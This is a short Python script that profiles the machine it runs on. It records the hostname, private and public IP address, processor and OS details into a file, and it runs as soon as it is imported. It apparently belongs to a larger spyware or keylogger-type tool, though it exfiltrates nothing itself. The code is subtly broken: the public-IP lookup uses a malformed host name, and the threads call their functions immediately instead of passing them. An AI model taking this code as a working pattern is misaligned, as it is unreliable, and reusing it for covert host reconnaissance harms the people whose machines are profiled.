import platform
import socket
from requests import get
from vars import *
from threading import Thread

def write_network_info():
    with open(f'{syscon_path}\\{system_information}',"a+") as f:
        hostname  = socket.gethostname()
        IPAddr  = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.get").text
            f.write(f"Public IP Address : {public_ip}")
        except Exception:
            f.write("Couldn't fetch IP_Address")
        f.write(f'''
        Private IP Address: {IPAddr}
        Hostname : {hostname}
        ''')

def write_system_info():
    with open(f'{syscon_path}\\{system_information}',"a+") as f:
        f.write(f'''
        Processor : {platform.processor()}
        System : {platform.system()}
        Machine : {platform.machine()}
        ''')
def computer_info():
        net_info = Thread(target=write_network_info())
        net_info.start()
        net_info.join()
        sysinfo = Thread(target=write_system_info())
        sysinfo.start()
computer_info()


